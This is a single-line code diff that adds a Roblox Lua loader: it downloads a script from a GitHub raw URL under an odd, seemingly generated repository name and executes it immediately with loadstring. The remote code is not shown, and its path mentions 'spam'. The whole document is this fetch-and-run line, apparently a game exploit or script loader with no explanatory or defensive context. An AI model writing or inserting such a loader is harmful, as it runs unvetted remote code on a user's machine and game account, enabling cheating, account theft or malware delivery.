@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/makeup-star-spam6-ie7xihb4oe6gtg.lua"))()
